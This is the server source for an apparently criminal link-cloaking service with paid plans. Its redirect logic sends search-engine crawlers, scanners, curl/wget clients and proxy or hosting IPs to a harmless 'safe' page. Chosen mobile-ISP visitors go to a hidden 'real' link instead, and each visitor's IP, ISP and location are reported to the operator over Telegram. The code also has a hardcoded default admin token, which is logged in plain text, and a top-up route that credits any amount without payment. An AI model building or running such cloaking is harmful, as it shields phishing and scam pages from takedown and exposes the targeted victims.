const express = require('express');
require('dotenv').config();
const axios = require('axios');
const path = require('path');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const bcrypt = require('bcryptjs');
const net = require('net');
const db = require('./db');

const app = express();
const port = process.env.PORT || 3000;

// Error handling wrapper for async routes
const asyncHandler = fn => (req, res, next) => {
    return Promise.resolve(fn(req, res, next)).catch((err) => {
        console.error(`[Error] ${req.method} ${req.url}:`, err);
        res.status(500).json({ error: 'Internal Server Error', details: err.message });
    });
};

app.set('trust proxy', true);

app.use(helmet({
    contentSecurityPolicy: false, // Temporarily disable CSP to ensure pages load on all browsers/environments
    referrerPolicy: { policy: 'no-referrer' }
}));

app.disable('x-powered-by');

app.use(express.json());
app.use(cookieParser());

// Request logging for debugging
app.use((req, res, next) => {
    console.log(`[Request] ${req.method} ${req.url}`);
    next();
});

app.use(session({
    secret: process.env.SESSION_SECRET || 'saas-proxy-secret',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: process.env.NODE_ENV === 'production', maxAge: 24 * 60 * 60 * 1000 }
}));

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'DELETE'],
    allowedHeaders: ['Content-Type']
}));

app.use(express.static('public'));

app.get('/', (req, res) => {
    if (req.session.userId) {
        return res.redirect('/dashboard.html');
    }
    res.redirect('/login');
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/signup', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'signup.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// --- Authentication Middleware ---
async function requireAuth(req, res, next) {
    try {
        if (!req.session.userId) {
            console.log(`[Auth] Unauthorized access to ${req.url}`);
            return res.status(401).json({ error: 'Unauthorized' });
        }
        const user = await db.findUserById(req.session.userId);
        if (!user) {
            console.log(`[Auth] User not found for session ${req.session.userId}`);
            req.session.destroy();
            return res.status(401).json({ error: 'User not found' });
        }
        req.user = user;
        next();
    } catch (err) {
        console.error('[Auth] Middleware Error:', err);
        res.status(500).json({ error: 'Auth middleware error' });
    }
}

function requireAdmin(req, res, next) {
    const token = (req.headers['x-admin-token'] || req.query.token || "").trim();
    const envToken = (process.env.ADMIN_TOKEN || "admin123").trim(); // Default for safety if not set, but user should set it
    
    if (token !== envToken) {
        console.log(`[Admin] Unauthorized attempt. Received: "${token}", Expected: "${envToken}"`);
        return res.status(401).json({ error: 'Unauthorized Admin' });
    }
    next();
}

// --- Admin Routes ---
app.get('/api/admin/users', requireAdmin, asyncHandler(async (req, res) => {
    const users = await db.getUsers();
    res.json(users.map(({ password, ...u }) => u));
}));

app.post('/api/admin/update-balance', requireAdmin, asyncHandler(async (req, res) => {
    const { userId, amount } = req.body;
    const user = await db.findUserById(userId);
    if (!user) return res.status(404).json({ error: 'User not found' });
    
    const updatedUser = await db.updateUser(userId, { wallet: parseFloat(amount) });
    res.json(updatedUser);
}));

app.post('/api/admin/toggle-status', requireAdmin, asyncHandler(async (req, res) => {
    const { userId } = req.body;
    const user = await db.findUserById(userId);
    if (!user) return res.status(404).json({ error: 'User not found' });
    
    const updatedUser = await db.updateUser(userId, { isActive: !user.isActive });
    res.json(updatedUser);
}));

// --- Auth Routes ---
app.post('/api/signup', asyncHandler(async (req, res) => {
    const { name, email, telegram, password } = req.body;
    if (!name || !email || !telegram || !password) {
        return res.status(400).json({ error: 'All fields are required' });
    }

    const existingUser = await db.findUserByEmail(email);
    if (existingUser) {
        return res.status(400).json({ error: 'Email already registered' });
    }

    const hashedPassword = await bcrypt.hash(password, 10);
    const user = await db.createUser({ name, email, telegram, password: hashedPassword });
    console.log(`[Signup] New user registered: ${email}`);
    res.json({ message: 'Signup successful' });
}));

app.post('/api/login', asyncHandler(async (req, res) => {
    const { email, password } = req.body;
    const user = await db.findUserByEmail(email);
    if (!user || !(await bcrypt.compare(password, user.password))) {
        console.log(`[Login] Failed login attempt for ${email}`);
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    req.session.userId = user.id;
    console.log(`[Login] User logged in: ${email}`);
    res.json({ message: 'Login successful' });
}));

app.post('/api/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) {
            console.error('[Logout] Error destroying session:', err);
            return res.status(500).json({ error: 'Logout failed' });
        }
        res.clearCookie('connect.sid'); // Clear the session cookie
        res.json({ message: 'Logged out' });
    });
});

app.get('/api/user', requireAuth, asyncHandler(async (req, res) => {
    const { password, ...userWithoutPassword } = req.user;
    res.json(userWithoutPassword);
}));

// --- Settings & Wallet Routes ---
app.post('/api/settings', requireAuth, asyncHandler(async (req, res) => {
    const updatedUser = await db.updateUser(req.user.id, {
        settings: { ...req.user.settings, ...req.body }
    });
    res.json(updatedUser.settings);
}));

app.post('/api/topup', requireAuth, asyncHandler(async (req, res) => {
    const { amount } = req.body;
    const updatedUser = await db.updateUser(req.user.id, {
        wallet: req.user.wallet + amount
    });
    res.json({ balance: updatedUser.wallet });
}));

app.post('/api/forced-ips', requireAuth, asyncHandler(async (req, res) => {
    const { ip } = req.body;
    if (!req.user.forcedIps.includes(ip)) {
        await db.updateUser(req.user.id, { forcedIps: [...req.user.forcedIps, ip] });
    }
    res.json({ message: 'IP added' });
}));

app.get('/api/links', requireAuth, asyncHandler(async (req, res) => {
    res.json(req.user.links || []);
}));

app.post('/api/links', requireAuth, asyncHandler(async (req, res) => {
    const { name, realLink, nonRealLink, slug, antiRed, ispFilter, mobileIsps, reallowVisited, duration } = req.body;
    
    const prices = { '3days': 15, '1week': 25, '2weeks': 50, 'month': 80 };
    const price = prices[duration];

    if (!price) return res.status(400).json({ error: 'Invalid duration selected' });

    if (req.user.wallet < price) {
        return res.status(400).json({ error: `Insufficient credits. This plan requires $${price.toFixed(2)}.` });
    }

    if (!name || !realLink || !nonRealLink) {
        return res.status(400).json({ error: 'Name, Real Link, and Safe Link are required' });
    }

    const newSlug = slug || require('crypto').randomBytes(4).toString('hex');
    
    if (slug && !/^[a-zA-Z0-9-]+$/.test(slug)) {
        return res.status(400).json({ error: 'Slug can only contain letters, numbers, and dashes' });
    }

    const existing = await db.findUserBySlug(newSlug);
    if (existing) {
        return res.status(400).json({ error: 'Slug already in use' });
    }

    const now = new Date();
    let expiry = new Date(now);
    if (duration === '3days') expiry.setDate(expiry.getDate() + 3);
    else if (duration === '1week') expiry.setDate(expiry.getDate() + 7);
    else if (duration === '2weeks') expiry.setDate(expiry.getDate() + 14);
    else if (duration === 'month') expiry.setMonth(expiry.getMonth() + 1);

    const newLink = {
        id: require('uuid').v4(),
        name,
        realLink,
        nonRealLink,
        slug: newSlug,
        antiRed: antiRed !== undefined ? antiRed : true,
        ispFilter: ispFilter !== undefined ? ispFilter : true,
        mobileIsps: mobileIsps || req.user.settings.mobileIsps,
        reallowVisited: reallowVisited !== undefined ? reallowVisited : true,
        expiryDate: expiry.toISOString(),
        createdAt: new Date().toISOString()
    };

    const updatedUser = await db.updateUser(req.user.id, {
        wallet: req.user.wallet - price,
        links: [...(req.user.links || []), newLink]
    });

    res.json({ ...newLink, balance: updatedUser.wallet });
}));

app.delete('/api/links/:slug', requireAuth, asyncHandler(async (req, res) => {
    const { slug } = req.params;
    const updatedLinks = (req.user.links || []).filter(l => l.slug !== slug);
    await db.updateUser(req.user.id, { links: updatedLinks });
    res.json({ message: 'Link deleted' });
}));

app.put('/api/links/:oldSlug', requireAuth, asyncHandler(async (req, res) => {
    const { oldSlug } = req.params;
    const { name, realLink, nonRealLink, slug, antiRed, ispFilter, mobileIsps, reallowVisited } = req.body;

    if (!name || !realLink || !nonRealLink) {
        return res.status(400).json({ error: 'Name, Real Link, and Safe Link are required' });
    }

    const newSlug = slug || oldSlug;

    // Validate slug
    if (newSlug && !/^[a-zA-Z0-9-]+$/.test(newSlug)) {
        return res.status(400).json({ error: 'Slug can only contain letters, numbers, and dashes' });
    }

    // Check if new slug is taken by another user/link
    if (newSlug !== oldSlug) {
        const existing = await db.findUserBySlug(newSlug);
        if (existing) return res.status(400).json({ error: 'New slug already in use' });
    }

    const links = req.user.links || [];
    const index = links.findIndex(l => l.slug === oldSlug);
    if (index === -1) return res.status(404).json({ error: 'Link not found' });

    links[index] = {
        ...links[index],
        name,
        realLink,
        nonRealLink,
        slug: newSlug,
        antiRed: antiRed !== undefined ? antiRed : links[index].antiRed,
        ispFilter: ispFilter !== undefined ? ispFilter : links[index].ispFilter,
        mobileIsps: mobileIsps !== undefined ? mobileIsps : links[index].mobileIsps,
        reallowVisited: reallowVisited !== undefined ? reallowVisited : links[index].reallowVisited,
        updatedAt: new Date().toISOString()
    };

    await db.updateUser(req.user.id, { links });
    res.json(links[index]);
}));

app.delete('/api/forced-ips/:ip', requireAuth, asyncHandler(async (req, res) => {
    const { ip } = req.params;
    await db.updateUser(req.user.id, { forcedIps: req.user.forcedIps.filter(i => i !== ip) });
    res.json({ message: 'IP removed' });
}));

app.post('/api/renew-link', requireAuth, asyncHandler(async (req, res) => {
    const { slug, duration } = req.body;
    const prices = { '3days': 15, '1week': 25, '2weeks': 50, 'month': 80 };
    const price = prices[duration];

    if (!price) return res.status(400).json({ error: 'Invalid duration selected' });

    if (req.user.wallet < price) {
        return res.status(400).json({ error: `Insufficient credits. This plan requires $${price.toFixed(2)}.` });
    }

    const now = new Date();
    
    // Check if it's the default link
    if (slug === req.user.slug) {
        let expiry = new Date(req.user.expiryDate && new Date(req.user.expiryDate) > now ? req.user.expiryDate : now);
        if (duration === '3days') expiry.setDate(expiry.getDate() + 3);
        else if (duration === '1week') expiry.setDate(expiry.getDate() + 7);
        else if (duration === '2weeks') expiry.setDate(expiry.getDate() + 14);
        else if (duration === 'month') expiry.setMonth(expiry.getMonth() + 1);

        const updatedUser = await db.updateUser(req.user.id, {
            wallet: req.user.wallet - price,
            expiryDate: expiry.toISOString()
        });

        return res.json({ message: 'Default uplink extended', expiryDate: updatedUser.expiryDate, balance: updatedUser.wallet });
    }

    // Check custom links
    const links = req.user.links || [];
    const index = links.findIndex(l => l.slug === slug);
    if (index === -1) return res.status(404).json({ error: 'Uplink not found' });

    let currentExpiry = links[index].expiryDate;
    let expiry = new Date(currentExpiry && new Date(currentExpiry) > now ? currentExpiry : now);
    
    if (duration === '3days') expiry.setDate(expiry.getDate() + 3);
    else if (duration === '1week') expiry.setDate(expiry.getDate() + 7);
    else if (duration === '2weeks') expiry.setDate(expiry.getDate() + 14);
    else if (duration === 'month') expiry.setMonth(expiry.getMonth() + 1);

    links[index].expiryDate = expiry.toISOString();

    const updatedUser = await db.updateUser(req.user.id, {
        wallet: req.user.wallet - price,
        links: links
    });

    res.json({ message: 'Uplink extended', expiryDate: links[index].expiryDate, balance: updatedUser.wallet });
}));

app.get('/api/isps', (req, res) => {
    const isps = (process.env.MOBILE_ISPS || "").split(',').map(isp => isp.trim()).filter(isp => isp !== "");
    res.json(isps);
});

// --- Proxy Redirection Logic ---
const BOT_UA_REGEX = /googlebot|bingbot|yandexbot|duckduckbot|slurp|baiduspider|facebot|ia_archiver|crawler|spider|robot|curl|wget|python|postman|insomnia|headless|screaming frog|ahrefsbot|semrushbot|mj12bot|dotbot|rogerbot|exabot|petalbot/i;

function isBot(req) {
    const ua = req.headers['user-agent'] || '';
    return !ua || BOT_UA_REGEX.test(ua);
}

app.get('/l/:slug', async (req, res) => {
    const slug = req.params.slug;
    const result = await db.findUserBySlug(slug);
    if (!result || !result.user) {
        console.warn(`[Proxy] Slug not found: ${slug} (Full URL: ${req.originalUrl})`);
        return res.status(404).send('Uplink Not Found. Please check your link or renew it in the dashboard.');
    }
    if (result.user.wallet <= 0) {
        console.warn(`[Proxy] Inactive account for slug: ${slug}`);
        return res.status(404).send('Account Inactive due to insufficient credits.');
    }
    return handleRedirection(result.user, req, res, result.link);
});

app.get('/u/:userId', async (req, res) => {
    const user = await db.findUserById(req.params.userId);
    if (!user || user.wallet <= 0) {
        return res.status(404).send('Not Found or Account Inactive');
    }
    // Default link settings for legacy /u/ route
    const defaultLink = {
        realLink: user.settings.realLink,
        nonRealLink: user.settings.nonRealLink
    };
    return handleRedirection(user, req, res, defaultLink);
});

async function handleRedirection(user, req, res, linkData) {
    if (!user.isActive) {
        return res.status(403).send('Account Suspended or Inactive');
    }
    
    // Check specific link expiry
    const linkExpiry = linkData.expiryDate || user.expiryDate;
    if (!linkExpiry || new Date(linkExpiry) < new Date()) {
        return res.status(403).send('Tracking Link Expired. Please renew in dashboard.');
    }

    const { settings, forcedIps, visitedIps } = user;
    const clientIp = req.ip;
    const userAgent = req.headers['user-agent'] || 'Unknown';

    const realLink = linkData.realLink || settings.realLink;
    const nonRealLink = linkData.nonRealLink || settings.nonRealLink;
    const useAntiRed = linkData.antiRed !== undefined ? linkData.antiRed : settings.antiRed;
    const useIspFilter = linkData.ispFilter !== undefined ? linkData.ispFilter : settings.ispFilter;
    const useMobileIsps = linkData.mobileIsps || settings.mobileIsps;
    const useReallowVisited = linkData.reallowVisited !== undefined ? linkData.reallowVisited : settings.reallowVisited;

    if (isBot(req)) {
        return res.redirect(nonRealLink || '/');
    }

    // 1. Forced Redirect Check
    if (forcedIps.includes(clientIp)) {
        return res.redirect(realLink);
    }

    // 2. Visited IP Check
    const isVisited = visitedIps.some(v => v.ip === clientIp);
    if (isVisited && !useReallowVisited) {
        return res.redirect(nonRealLink);
    }

    // 3. IP Analysis
    let data = null;
    try {
        const response = await axios.get(`http://ip-api.com/json/${clientIp}?fields=status,message,country,regionName,city,isp,org,as,proxy,hosting,query`, { timeout: 5000 });
        data = response.data;
    } catch (error) {
        console.error('ISP lookup failed:', error.message);
    }

    const isProxy = data && data.proxy === true;
    const isHosting = data && data.hosting === true;
    const isSuspicious = isProxy || isHosting;

    // 4. Filtering Logic
    let targetUrl = realLink;

    if (useAntiRed && isSuspicious) {
        targetUrl = nonRealLink;
    } else if (useIspFilter && data && data.status === 'success') {
        const userISP = (data.isp || data.org || "").toUpperCase();
        const matches = useMobileIsps.some(isp => userISP.includes(isp.toUpperCase()));
        if (!matches) {
            targetUrl = nonRealLink;
        }
    }

    // 5. Update Visited IPs
    if (!isVisited) {
        const redirectType = targetUrl === realLink ? 'REAL' : 'SAFE';
        const newVisited = [...visitedIps, { 
            ip: clientIp, 
            timestamp: Date.now(), 
            type: redirectType,
            isp: data ? data.isp : 'Unknown',
            location: data ? `${data.city}, ${data.country}` : 'Unknown'
        }];
        await db.updateUser(user.id, { visitedIps: newVisited });
    }

    // 6. Telegram Notification
    const botToken = settings.botToken || process.env.TELEGRAM_BOT_TOKEN;
    const chatId = settings.chatId || process.env.TELEGRAM_CHAT_ID;

    if (botToken && chatId) {
        let message = `🚀 *New Visit!* (User: ${user.name})\n\n`;
        message += `📍 *IP:* ${clientIp}\n🏢 *ISP:* ${data ? data.isp : 'Unknown'}\n🌍 *Location:* ${data ? `${data.city}, ${data.country}` : 'Unknown'}\n💻 *UA:* ${userAgent}\n🎯 *Target:* ${targetUrl === realLink ? 'REAL' : 'SAFE'}`;
        
        axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        }).catch(() => {});
    }

    if (!targetUrl) return res.send("Configuration missing for links.");
    res.redirect(targetUrl);
}

app.listen(port, () => {
    console.log(`SaaS Proxy server running on port ${port}`);
});
